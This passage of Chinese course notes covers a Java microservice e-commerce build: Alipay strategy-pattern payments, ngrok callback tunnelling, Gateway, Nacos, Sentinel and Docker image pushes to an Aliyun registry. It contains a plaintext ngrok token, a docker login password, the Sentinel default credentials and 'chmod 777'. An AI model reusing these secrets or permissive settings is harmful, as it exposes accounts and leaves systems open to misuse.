  - Java AWT中的LayoutManager，即布局管理器
  - 如果在一个系统里面有许多类，它们之间的区别仅在于它们的行为，那么可以使用策略模式
  - 不希望暴露复杂的、与算法有关的数据结构，那么可以使用策略模式来封装算法
  - 对接第三方支付里面，微信支付、支付宝支付等都可以是一种策略

 

- 角色
  - Context上下文：屏蔽高层模块对策略、算法的直接访问，封装可能存在的变化
  - Strategy策略角色：抽象策略角色，是对策略、算法家族的抽象，定义每个策略或算法必须具有的方法和属性
  - ConcreteStrategy具体策略角色：用于实现抽象策略中的操作，即实现具体的算法

![image-20210304200450147](img/image-20210304200450147.png)



















#### 第4集 多渠道支付对接-策略模式+工厂模式编码实战

**简介：多渠道支付对接-策略模式+工厂模式编码实战**

* PayInfoVO类开发
* 策略接口开发 PayStrategy
* 策略上下文 PayStrategyContext开发
* 具体支付策略开发 AlipayStrategy、WechatPayStrategy
* 简单工厂类开发































#### 第5集 策略设计模式-支付宝支付下单策略编码实战

**简介：支付宝支付策略编码实战**

* 下单策略编码实战
* 二次支付订单超时设计考虑





























#### 第6集 策略设计模式-支付宝订单状态查询编码实战

**简介：支付宝订单状态查询策略编码实战**

* 订单状态查询策略编码实战

* 接口文档：https://opendocs.alipay.com/apis/api_1/alipay.trade.query

  
















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十四章  内网穿透工具和支付结果通知回调模块开发



#### 第1集 内网穿透映射工具介绍和使用

**简介：内网穿透映射工具介绍和使用**

* 什么是内网穿透

```
支付成功需要配置回调通知应用服务器订单支付成功，需要配置对应的域名

在本地电脑开发，支付宝没法回调，所以需要配置个地址映射，就是外部服务器

可以通过这个地址访问当前开发电脑的地址
```

* 工具

  * ngrock https://ngrok.com/

  * 花生壳 https://hsk.oray.com/

  * natapp https://natapp.cn/

  * 小米球 http://ngrok.ciqiuwl.cn/

    

* 账号申请

```
#配置token和子域名
token:  A3dc8765c57f4e6e8Ac84276deA889c4

#增加权限
chmod 777 ./*

#启动
./ngrok -log=ngrok.log -config ngrok.conf start httptun httpstun
```



* 地址配置

  * 回调地址：外网可以访问
    * http://xdclass.ngrok2.xiaomiqiu.cn/api/callback/order/v1/alipay
  * 支付成功配置：外网可以访问

  ![image-20210305161500402](img/image-20210305161500402.png)

* 访问测试

















#### 第2集 支付宝支付结果通知回调地址配置和接口开发

**简介：支付结果通知回调地址配置和接口开发**

* 补充支付宝手机支付文档：https://opendocs.alipay.com/open/203/105286
* 支付宝沙箱环境配置支付结果通知回调地址
* 配置文件配置支付结果通知回调地址
* controller接口开发

* 工具转换

```
  /**
     * 将request中的参数转换成Map
     * @param request
     * @return
     */
    private static Map<String, String> convertRequestParamsToMap(HttpServletRequest request) {
        Map<String, String> paramsMap = new HashMap<>(16);
        Set<Map.Entry<String, String[]>> entrySet = request.getParameterMap().entrySet();

        for (Map.Entry<String, String[]> entry : entrySet) {
            String name = entry.getKey();
            String[] values = entry.getValue();
            int size = values.length;
            if (size == 1) {
                paramsMap.put(name, values[0]);
            } else {
                paramsMap.put(name, "");
            }
        }
        System.out.println(paramsMap);
        return paramsMap;
    }
```

























#### 第3集 支付宝支付结果通知回调验证签和更新订单状态开发

**简介：支付结果通知回调验证签和更新订单状态开发**

* 文档：https://opensupport.alipay.com/support/helpcenter/193/201602472200?ant_source=antsupport
* 回调业务逻辑开发
* 更新订单状态
* 如何保证幂等性： 可以不做幂等性处理，本身不影响






















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十五章 订单微服务下单链路完善和支付整合测试





#### 第1集 下单支付链路和超时未支付定时关单功能开发完善

**简介：下单支付链路和超时未支付定时关单功能开发完善**

* 下单支付功能开发
* 消费者功能完善
* 查询订单状态

























#### 第2集 订单微服务下单支付全链路多场景测试准备工作

**简介：订单微服务下单支付宝支付全链路多场景测试工作工作**

* 下单支付全链路测试-支付-超时未支付

* 登录-加入购物车-使用优惠券-下单-支付

* 登录-加入购物车-使用优惠券-下单-不支付

* 测试准备工作

  * 修改多个微服务的死信队列

    * 订单5分钟内支付未支付则关单
    * 延迟消息6分钟
    * 修改了延迟队列的属性，记得先删除下全部交换机和队列

  * 检查优惠券记录和商品库存

    

  

* 注意：

  * bug修改：saveProductOrder方法

  * 初次启动微服务记得先调用下，防止超时

    

















#### 第3集 订单微服务下单支付全链路多场景测试

**简介：订单微服务下单支付宝支付全链路多场景测试**

* 登录-加入购物车-使用优惠券-下单-支付
  * 代码本身有问题-比如真的少了参数
    * 代码bug修改下单协议：total_amount、timeout_express
  * 支付沙箱环境抽风（偶尔出现）
* 下单支付全链路测试-支付-超时未支付（优惠券记录释放正常、商品库存释放正常、订单关闭正常）
* 登录-加入购物车-使用优惠券-下单-不支付(数据正常)

```
{
  "coupon_record_id":50,
  "product_ids":[1,2],
  "pay_type":"ALIPAY",
  "client_type":"H5",
  "address_id":45,
  "total_amount":510,
  "real_pay_amount":505,
  "token":"SbD5D4FLpUzemiuwSEytwGM9LLFGISDQ"
}
```





















#### 第4集  订单微服务订单列表和订单项功能开发

**简介：订单微服务分页查询个人订单列表功能开发**

* 分页个人查询订单功能开发

  

  





















#### 第5集 未支付订单二次支付业务逻辑设计和编码实战

**简介：未支付订单二次支付业务逻辑设计和编码实战**

* controller开发
* service开发























#### 第6集 未支付订单二次支付全链路测试

**简介：未支付订单二次支付业务逻全链路测试**

* 全链路测试
* 加入购物车
* 下单不支付
* 我的订单列表
* 二次支付
* 备注
  * 测试的时候可以快速下两笔订单，3分钟内可以支付，3分钟后就不行
  * 订单支付超时，可以往前推，也可以往后推1分钟



















#### 第7集 订单微服务-避免重复下单token令牌机制+lua脚本原子操作

**简介：订单微服务-避免重复下单tokne令牌机制处理**

* 问题
  * 前端下单按钮重复点击导致订单创建多次
  * 前端有限制，后端也需要有限制
  * 任何提交表单的时候，都可以采用token令牌机制避免重复点击

* token令牌机制开发
  * 下单前先获取令牌-存储redis
  * 下单时一并把token提交并检验和删除-lua脚本

```
String script = "if redis.call('get',KEYS[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end";
```



































![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十六章 1024电商平台-Gateway网关引入和功能测试



#### 第1集 1024电商平台网关Gateway项目开发和配置

**简介：网关Gateway项目开发和配置**

* 依赖添加

```
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-gateway</artifactId>
        </dependency>

        <!--添加nacos客户端-->
        <dependency>
            <groupId>com.alibaba.cloud</groupId>
            <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>
        </dependency>


        <!--配置中心-->
        <dependency>
            <groupId>com.alibaba.cloud</groupId>
            <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>
        </dependency>
```



* 启动类配置
* 路由映射配置

```
server:
  port: 8889

spring:
  application:
    name: api-gateway
  cloud:
    #注册中心地址
    nacos:
      discovery:
        server-addr: 112.74.55.160:8848
    gateway:
      routes: #数组形式
        - id: product-service  #商品服务 路由唯一标识
          uri: lb://xdclass-product-service  #从nocas进行转发
          order: 1 #优先级，数字越小优先级越高

          predicates: #断言 配置哪个路径才转发，前端访问路径统一加上XXX-server，网关判断转发对应的服务，如果是回调业务记得修改
            - Path=/product-server/**
          filters: #过滤器，请求在传递过程中通过过滤器修改
            - StripPrefix=1  #去掉第一层前缀，转发给后续的路径
            
      #开启网关拉取nacos的服务
      discovery:
        locator:
          enabled: true

#设置日志级别,ERROR/WARN/INFO/DEBUG,默认是INFO以上才显示
logging:
  level:
    root: INFO
    com.alibaba.nacos.client.config.impl: WARN

```



















#### 第2集 1024电商平台整体功能测试验证《上》

**简介：1024电商平台整体功能测试验证《上》**

* 用户微服务验证
* 优惠券微服务验证
* 商品微服务验证

![image-20210307162422121](img/image-20210307162422121.png)

























#### 第3集 1024电商平台整体功能测试验证《下》

**简介：1024电商平台整体功能测试验证《下》**

* 订单微服务验证

* 大部业务功能都完成了，接下去就是微服务全家桶引入+容器编排部署























![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十七章 微服务配置中心引入和Sentinel限流配置



#### 第1集 1024电商平台Nacos配置中心开发和配置

**简介：微服务配置中心引入和配置**

* 配置中心引入-common项目添加

```
 <!--配置中心-->
       <dependency>
           <groupId>com.alibaba.cloud</groupId>
           <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>
       </dependency>
```



- 配置文件优先级讲解
  - 不能使用原先的application.yml, 需要使用bootstrap.yml作为配置文件
  - 配置读取优先级 bootstrap.yml > application.yml
- 配置实操
  - 服务迁移配置
  - 增加bootstrap.yml

```
spring:
  application:
    name: xdclass-order-service
  cloud:
    nacos:
      config:
        server-addr: 127.0.0.1:8848 #Nacos配置中心地址
        file-extension: yaml #文件拓展格式

  profiles:
    active: dev
```



* 启动微服务服务验证
  * 测试是否可以获取配置

```
浏览器访问 
http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=xdclass-coupon-service-dev.yaml&group=DEFAULT_GROUP

部分同学如果出现 config dta not exist 建议重启nacos

除开上述问题，如果还是拉取不到配置(保持和课程版本，文件名一样先)

重新构建下项目 

mvn clean package -U

然后重启IDEA
```

* dataId组成，在 Nacos Spring Cloud 中，dataId 的完整格式如下

```
${prefix}-${spring.profiles.active}.${file-extension}

prefix 默认为 spring.application.name 的值

spring.profiles.active 即为当前环境对应的 profile
当 spring.profiles.active 为空时，对应的连接符 - 也将不存在，dataId 的拼接格式变成 ${prefix}.${file-extension}

file-exetension 为配置内容的数据格式，可以通过配置项 spring.cloud.nacos.config.file-extension 来配置。目前只支持 properties 和 yaml 类型。
```

![image-20200911132840504](img/image-20200911132840504.png)





















#### 第2集 微服务Nacos配置中心迁移和功能验证

**简介：1024电商平台Nacos配置中心开发和功能验证**

* 微服务配置迁移
* 微服务功能验证



































#### 第3集 高并发下的限流神器Sentinel容器化部署

**简介：Sentinel容器化部署**

- 什么是Sentinel

  - 阿里巴巴开源的分布式系统流控工具
  - 以流量为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性
  - 丰富的应用场景：消息削峰填谷、集群流量控制、实时熔断下游不可用应用等
  - 完备的实时监控：Sentinel 同时提供实时的监控功能
  - 提供开箱即用的与其它开源框架/库的整合模块，例如与 Spring Cloud、Dubbo、gRPC 的整合

  ![Sentinel-features-overview](img/50505538-2c484880-0aaf-11e9-9ffc-cbaaef20be2b.png)

- 文档：https://github.com/alibaba/Sentinel/wiki/控制台

- Sentinel 分为两个部分

  - 核心库（Java 客户端）不依赖任何框架/库，能够运行于所有 Java 运行时环境，同时对 Dubbo、Spring Cloud 等框架也有较好的支持。
  - 控制台（Dashboard）基于 Spring Boot 开发，打包后可以直接运行，不需要额外的 Tomcat 等应用容器。

- docker容器化部署sentinel

```
docker pull bladex/sentinel-dashboard:latest
```

- 查看镜像

```
docker images
```

- 启动Sentinel

```
docker run --name sentinel -d -p 8858:8858  镜像id
```

- 访问Sentinel（记得检查防火墙或者网络安全组）

```
http://公网ip:8858

# 登录密码默认sentinel/sentinel
```

















#### 第4集 微服务整合Sentinel项目依赖配置

**简介：微服务整合Sentinel项目依赖配置**

* common项目添加依赖（网关也需要添加）

```
<dependency>
            <groupId>com.alibaba.cloud</groupId>
            <artifactId>spring-cloud-starter-alibaba-sentinel</artifactId>
</dependency>
```

* 多个微服务接入Sentinel配置

```
spring:
  cloud:
    sentinel:
      transport:
        dashboard: 192.168.0.88:8858
        port: 9999 

#dashboard: 8858 控制台端口
#port: 9999 本地启的端口，随机选个不能被占用的，与dashboard进行数据交互，会在应用对应的机器上启动一个 Http Server，该 Server 会与 Sentinel 控制台做交互, 若被占用,则开始+1一次扫描
```

* 微服务注册上去后，由于Sentinel是懒加载模式，所以需要访问微服务后才会在控制台出现

  



















#### 第5集 网关+微服务Sentinel限流实战和问题引出

**简介：微服务Sentinel限流配置实战和问题引出**

* 优惠券列表接口限流配置
  * 其他的根据实际情况配置
* 默认是在微服务内存中，重启后就丢失
  * 解决：持久化配置到配置中心Nacos, 并落地数据库

* 流控协议不明显
  * Blocked by Sentinel (flow limiting)
* 影响接口性能的点
  * 代码
  * CPU、内存
  * 带宽、IO

























#### 第6集 微服务整合Sentinel自定义降级异常数据开发实战

**简介：微服务整合Sentinel自定义降级异常数据开发实战**

* 异常种类

  ```
  FlowException  //限流异常
  DegradeException  //降级异常
  ParamFlowException //参数限流异常
  SystemBlockException //系统负载异常
  AuthorityException //授权异常
  ```

* 【新版】实现BlockExceptionHandler并且重写handle方法

  ```
  @Component
  public class XdclassUrlBlockHandler implements BlockExceptionHandler {
      @Override
      public void handle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, BlockException e) throws IOException {
      
      }
  }
  ```

  



















#### 第7集 生产环境-Sentinel流控规则持久化到nacos配置中心《上》

**简介：微服务Sentinel流控规则持久化到nacos配置中心**

* 文档: https://github.com/alibaba/Sentinel/wiki/%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%B8%AD%E4%BD%BF%E7%94%A8-Sentinel
* 生产环境下更常用 push 模式的数据源
* 流控规则持久化到nacos配置中心配置-common和gateway都添加

```
<dependency>
           <groupId>com.alibaba.csp</groupId>
           <artifactId>sentinel-datasource-nacos</artifactId>
</dependency>

```

* 配置持久化数据源

```
  #流控面板ip
    sentinel:
      transport:
        dashboard: 112.74.55.160:8858
    #流控规则持久化到nacos配置中心
      datasource:
        ds1:
          nacos:
            server-addr: 192.168.0.88:8848
            data-id: ${spring.application.name}.json
            group-id: DEFAULT_GROUP
            data-type: json
            rule-type: flow
```

* 配置中心配置

```
[
    {
        "resource":"/test",
        "controlBehavior":0,
        "count":2,
        "grade":1,
        "limitApp":"default",
        "strategy":0
    },
    {
        "resource":"/api/coupon/v1/page_coupon",
        "controlBehavior":0,
        "count":1,
        "grade":1,
        "limitApp":"default",
        "strategy":0
    }
]
```

* 解释

```
resource：资源名，
limitApp：流控针对的调用来源，若为 default 则不区分调用来源
grade：限流类型（QPS 或并发线程数）,0代表根据并发数量来限流，1代表根据QPS来进行流量控制
count：限流阈值
strategy：调用关系限流策略
controlBehavior：流量控制效果（直接拒绝、Warm Up、匀速排队）
clusterMode：是否为集群模式，存在问题
```









#### 第8集 生产环境-Sentinel流控规则持久化到nacos配置中心《下》

**简介：微服务Sentinel流控规则持久化到nacos配置中心**

* 流控规则持久化测试
* 如果再sentinel控制台修改了配置，会不会反向同步到nacos里？？？
  * 再sentinel控制台修改不会同步到nacos
  * 如果要修改策略，只能在nacos里面修改

* 集群流控问题
  * https://github.com/alibaba/Sentinel/wiki/%E9%9B%86%E7%BE%A4%E6%B5%81%E6%8E%A7#%E9%85%8D%E7%BD%AE%E6%96%B9%E5%BC%8F

* 限流测试-重启微服务
* 每个微服务都没做流控限制（优惠券微服务只是做了一个配置的例子）





























![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十八章 1024电商平台容器化部署Docker镜像打包



#### 第1集 微服务Docker打包插件介绍和配置实战

**简介：微服务Docker打包插件配置**

* 微服务采用容器化部署->本地推送镜像到镜像仓库->Paas容器云管理平台拉取部署

* SpringBoot打包插件配置

  * 聚合工程pom添加全局变量

  ```
          <docker.image.prefix>xdclass-cloud</docker.image.prefix>
  ```

  * 每个微服务都添加依赖(服务名记得修改)

  ```
   <build>
          <finalName>alibaba-cloud-user</finalName>
  
          <plugins>
              <plugin>
                  <groupId>org.springframework.boot</groupId>
                  <artifactId>spring-boot-maven-plugin</artifactId>
  
                  <!--需要加这个，不然打包镜像找不到启动文件-->
                  <executions>
                      <execution>
                          <goals>
                              <goal>repackage</goal>
                          </goals>
                      </execution>
                  </executions>
  
                  <configuration>
                      <fork>true</fork>
                      <addResources>true</addResources>
  
                  </configuration>
              </plugin>
  
              <plugin>
                  <groupId>com.spotify</groupId>
                  <artifactId>dockerfile-maven-plugin</artifactId>
                  <version>1.4.10</version>
                  <configuration>
  
                      <repository>${docker.image.prefix}/${project.artifactId}</repository>
  
                      <buildArgs>
                          <JAR_FILE>target/${project.build.finalName}.jar</JAR_FILE>
                      </buildArgs>
                  </configuration>
              </plugin>
  
          </plugins>
  
      </build>
  ```

  



















#### 第2集 Dockerfile配置文件编写和镜像仓库过大优化思路

**简介：微Dockerfile配置文件编写和镜像仓库优化思路**

* 微服务Dockerfile编写

```
FROM  adoptopenjdk/openjdk11:ubi
VOLUME /tmp
ARG JAR_FILE
COPY ${JAR_FILE} app.jar
ENTRYPOINT ["java","-jar","/app.jar"]
```

* docker镜像过大怎么办？

```
当下主流互联网公司，基本都是容器化部署微服务项目，但是存在一个比较多的问题是
每个微服务打包后的镜像特别大，虽然不影响业务，但是特别消耗内存，浪费资源。

使用docker前：一个springboot项目基本100M以下。
使用docker后：一个springboot项目的镜像就翻了好几倍

云服务器就很容易内存溢出导致成本过大

你知道哪些方式可以优化这个镜像打包过大的问题？
```

![image-20210306225435248](img/image-20210306225435248.png)

* 常见的优化思路,还有更多大家一起讨论

```
1、串联 Dockerfile 指令
在 Dockerfile 中， 每一条指令都会创建一个镜像层，会增加整体镜像的大小。
合并多个指令串起来执行，Dockerfile 中的 RUN 指令通过 && 和 /支持将命令串联在一起，可以省不少镜像层


2、选用更小的基础镜像，比如运行spring cloud项目，不必用jdk，直接选用jre镜像即可，
可以节省50%的内存甚至更多
```

* 优化后的Dockerfile

```
#FROM  adoptopenjdk/openjdk11:ubi
FROM  adoptopenjdk/openjdk11:jre11u-nightly
VOLUME /tmp
ARG JAR_FILE
COPY ${JAR_FILE} app.jar
ENTRYPOINT ["java","-jar","/app.jar"]
```



















#### 第3集 1024电商平台-多个微服务Docker镜像打包实战和注意事项

**简介：多个微服务Docker镜像打包实战**

* 多个微服务本地镜像打包

  * 步骤一：最外层 mvn clean install
  * 步骤二：去到子模块pom文件下

  ```
  mvn install -Dmaven.test.skip=true dockerfile:build
  ```

  

* 问题点：如果发现运行的镜像不是最新的

  * 项目的路径一定不要有中文和空格
  * 建议mvn clean install 构建下项目，
  * 再把本地历史docker镜像删除，再重新构建打包镜像















#### 第4集 多个微服务镜像本地运行和问题修复重新打包

**简介：多个微服务镜像本地运行和问题修复重新打包**

* 本地运行docker镜像

```
docker run  --name xdclass-coupon -d -p 9002:9002 镜像id
```

* 查看容器运行日志 

```
docker logs -f 容器id
```

* 大家测试的时候，可以先启动1~2个容器镜像（全部都启动需要很强大的配置）
  * 建议都在一个机器上运行，验证好后在分机器























![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十九章 阿里云Docker私有镜像仓和自动化构建脚本编写



####  第1集 容器化部署必备Docker公有+阿里云私有镜像仓库

**简介：掌握Docker仓库的知识**

- 为啥要用镜像仓库
- 官方公共镜像仓库和私有镜像仓库(画图)
  - 公共镜像仓库：
    - 官方：https://hub.docker.com/，基于各个软件开发或者有软件提供商开发的
    - 非官方：其他组织或者公司开发的镜像，供大家免费试用
  - 私有镜像仓库：
    - 用于存放公司内部的镜像，不提供给外部试用；
- 开通阿里云私有镜像仓库
  - 登录阿里云账号访问地址：
    - https://cr.console.aliyun.com/
  - 初次使用会提示开通

![image-20210309150009854](img/image-20210309150009854.png)















####  第2集 本地Docker镜像推送阿里云私有镜像仓

**简介：本地Docker镜像推送阿里云私有镜像仓**

* 阿里云镜像仓-创建仓库
  * https://cr.console.aliyun.com/
* 微服镜像推送私有镜像仓测试

* 打tag + 推送

```
方式一
docker tag 1473a42a5d37 registry.cn-shenzhen.aliyuncs.com/1024-cloud/api-gateway:v1

docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/api-gateway:v1

方式二
docker tag xdclass-cloud/xdclass-gateway:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/api-gateway:v2

docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/api-gateway:v2
```

* 全部微服务推送

```
网关
docker tag xdclass-cloud/xdclass-gateway:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/api-gateway:v1.1

docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/api-gateway:v1.1

订单
docker tag xdclass-cloud/xdclass-order-service:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-order-service:v1.1

docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-order-service:v1.1

商品
docker tag xdclass-cloud/xdclass-product-service:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-product-service:v1.1

docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-product-service:v1.1
用户
docker tag xdclass-cloud/xdclass-user-service:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-user-service:v1.1

docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-user-service:v1.1
优惠券
docker tag xdclass-cloud/xdclass-coupon-service:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-coupon-service:v1.1

docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-coupon-service:v1.1

```

![image-20210309152147418](img/image-20210309152147418.png)





















####  第3集 自动化构建微服务推送阿里云镜像仓shell脚本开发

**简介：自动化构建微服务推送阿里云镜像仓shell脚本开发**

* 常见的自动化构建工具
  * Jenkins
  * gitlab runner
  * shell脚本
* 编写shell脚本自动化构建推送镜像仓

```
#登录阿里云镜像仓
docker login --username=釉釉cxy registry.cn-shenzhen.aliyuncs.com --password=xdclass.net168


#构建整个项目，或者单独构建common项目,避免依赖未被构建上去
cd ../xdclass-common
mvn install


#构建网关
cd ../xdclass-gateway
mvn install -Dmaven.test.skip=true dockerfile:build
docker tag xdclass-cloud/xdclass-gateway:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/api-gateway:v1.2
docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/api-gateway:v1.2
echo "网关构建推送成功"


#用户服务
cd ../xdclass-user-service
mvn install -Dmaven.test.skip=true dockerfile:build
docker tag xdclass-cloud/xdclass-user-service:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-user-service:v1.2
docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-user-service:v1.2
echo "用户服务构建推送成功"


#商品服务
cd ../xdclass-product-service
mvn install -Dmaven.test.skip=true dockerfile:build
docker tag xdclass-cloud/xdclass-product-service:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-product-service:v1.2
docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-product-service:v1.2
echo "商品服务构建推送成功"



#订单服务
cd ../xdclass-order-service
mvn install -Dmaven.test.skip=true dockerfile:build
docker tag xdclass-cloud/xdclass-order-service:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-order-service:v1.2
docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-order-service:v1.2
echo "订单服务构建推送成功"


#优惠券服务
cd ../xdclass-coupon-service
mvn install -Dmaven.test.skip=true dockerfile:build
docker tag xdclass-cloud/xdclass-coupon-service:latest registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-coupon-service:v1.2
docker push registry.cn-shenzhen.aliyuncs.com/1024-cloud/xdclass-coupon-service:v1.2
echo "优惠券服务构建推送成功"


echo "=======构建脚本执行完毕====="

```

* 核心关键
  * shell脚本编写能力
  * 作业
    * 通过传参构建指定微服务(推荐大家完成)
    * 版本号 通过 年-月-日-时-分 v-2021-10-10-13-12













![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十章 云计算的知识你知道多少-带你急速掌握技术视野



####  第1集 云计算知识-公有云-私有云-混合云你知道多少

**简介：云计算知识-公有云-私有云-混合云你知道多少**

* 什么是云计算
  
* 一种按使用量付费的模式，这种模式提供可用的、便捷的、按需的网络访问，进入可配置的计算机资源共享池（资源包括网络、服务器、存储、应用软件、服务），这些资源能够被快速提供
  
* 优势和特点
  * 虚拟化：将一台计算机虚拟为多台逻辑计算机，相互独立的空间内运行而互不影响
  * 动态可扩展：能够使计算速度迅速提高，最终实现动态扩展虚拟化的层次达到对应用进行扩展的目的
  * 按需部署：云计算平台能够根据用户的需求快速配备计算能力及资源
  * 性价比高：将资源放在虚拟资源池中统一管理在一定程度上优化了物理资源，用户不再需要昂贵、存储空间大的主机
  * ...

* 云计算按服务类型可以分为三类

  * IaaS
  * PaaS
  * SaaS

* 按部署形式可以分为三类

  * 公有云

  ```
  指第三方提供商为用户提供的能够使用的云，比如我们经常使用阿里云即是一种公有云。
  
  可通过internet使用，价格非常的低廉，核心的属性是共享服务资源
  
  公有云被认为是云计算的主要形态，目前市场上公有云也是占据了较大的市场份额的，典型的几家阿里云、百度云、腾讯云、华为云和三个运营商等
  ```

  ![image-20210309165655329](img/image-20210309165655329.png)

  * 私有云

  ```
  拥有基础设施并可以控制在此设施上部署应用程序的方式，私有云可以部署在企业数据中心的防火墙内，核心属性是专有资源
  
  需要单独构建的，因而在数据安全性以及服务质量上自己可以有效的管控，私有云虽然数据安全性方面比公有云高，但是维护的成本也相对较大，对安全数据要求极其高的才有必要考虑
  ```

  

  * 混合云

  ```
  公有云和私有云组合起来，一部分业务使用公有云，一部分业务使用私有云，这就是混合云
  
  企业需要一些技术来实现两朵云的统一管理、监控、调度、数据同步等等,与只使用一种形态的云相比，混合云部署更复杂
  
  在成本和安全方面的一种折中方案,私有云还常常把公有云作为灾难恢复和灾难转移的平台。
  
  混合云在使用起来具有更高的灵活性,但复杂网络配置使得管理员的知识经验及能力受到挑战，学习成本更大
  ```

  

* 懂不? 不懂的话让老王来教你

  * 出租房的那些事情-房东就是云厂商
  * 小滴课堂-老王 跳槽面试，找公寓住，有时一个人住有时几个人住，和房东灵活租用，这个即公有云
  * 工作两年后，觉得租房不安全，就买了一套30平房子住，这个即私有云
  * 等有女友后觉的现在的房子不方便，就又租了一个公寓，混着住

  ![image-20210309165734508](img/image-20210309165734508.png)











####  第2集 云计算服务三层架构-IaaS-PaaS-SaaS-概念解析

**简介：云计算服务三层架构-IaaS-PaaS-SaaS急速掌握**

* 三种云服务模型, 也称为三层架构

  * IaaS 基础设施即服务 Infrastructure as a service

  ```
  通即虚拟的硬件资源，如虚拟的主机、存储、网络、安全等资源
  
  用户无需购买服务器、网络设备和存储设备，只需要通过网络租赁即可搭建自己的应用系统
  
  将硬件外包到别的地方去，IaaS公司会提供场外服务器，存储和网络硬件，你可以租用，节省了维护成本和办公场地
  
  公司产品 Amazon, Microsoft,阿里云，腾讯云，各自的产品
  
  最熟悉的例子：阿里云ECS主机的带宽、磁盘空间、GPU等
  
  ```

  * PaaS 平台即服务 platform as a service

  ```
  为开发人员提供了一个框架，使他们可以基于它创建自定义应用程序
  
  所有服务器，存储和网络都可以由企业或第三方提供商进行管理
  
  使开发人员可以自由地专注于创建软件，同时不必担心操作系统、软件更新，存储或基础架构
  
  公司产品：Google App Engine，Apache Stratos，OpenShift，阿里云，腾讯云等
  
  最熟悉的例子：阿里云OSS、RDB、短信服务、日志服务
  ```

  

  * SaaS 软件即服务 software as a service

  ```
  云应用程序服务,利用互联网向其用户提供应用程序，这些应用程序由第三方供应商管理
  
  大多数SaaS应用程序直接通过Web浏览器运行，不需要在客户端进行任何下载或安装
  
  具有多租户的特性，不需要额外加工，按需付费，因此成本低高效快捷
  
  公司产品：淘宝、小鹅通、亚马逊，CRM（客户关系管理）、HRM（人力资源管理）、SCM（供应链）
  ```


![image-20210310103012833](img/image-20210310103012833.png)















####  第3集 小滴课堂老王的经典例子-秒懂-IaaS-PaaS-SaaS

**简介：小滴课堂老王的经典例子-秒懂-IaaS-PaaS-SaaS**

* 它们的区别 ( 一个经典的图片)

![image-20210309173202109](img/image-20210309173202109.png)

* 最通俗的例子

  * 小滴课堂老王-【建房子娶老婆】和【在线教育平台】

    * 传统方式：设计、找地皮、造砖头、水泥、钢筋；消耗人力1000人

      * 买主机、建机房、找运营商弄带宽
      * 开发在线教育微服务平台
      * 开发部署-监控-发布平台
      * 消耗程序员：100人

      

    * IaaS 服务：直接花钱买厂商做好的 砖头、水泥、钢筋：消耗人力 500人

      * 直接租用阿里云的主机、选CPU、硬盘、内存、带宽等
      * 开发在线教育微服务平台
      * 开发部署-监控-发布平台
      * 消耗程序员：50人

      

    * PaaS服务：直接买厂商搭建好的墙面，自己组装；消耗人力100人

      * 开发在线教育微服务平台
        * 阿里云的数据库、缓存、MQ、分布式事务GTS、日志服务 等厂商直接提供的中间件服务
      * 开发部署-监控-发布平台
        * Rancher、KubeSphere、

      * 消耗程序员：20人

      

    * SAAS服务：直接买厂商做好的房子；消耗人力10人

      * 直接租用厂商提供的在线教育平台
      * 消耗程序员：1人

  ![image-20210310103104455](img/image-20210310103104455.png)

* 总结

  * 从Iaas到SaaS的过程，企业的云化的程度也越来越高，内部IT所需要做的事越来越少。

  * 可以这么看，运维同学经常打交道的是IaaS，开发经常打交道的是PaaS，运营和客户经常打交道的是SaaS

    










![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十一章  Docker容器化部署存在的问题和解决方案



#### 第1集 微服务容器化docker部署存在的问题

**简介：微服务容器化docker部署存在的问题**

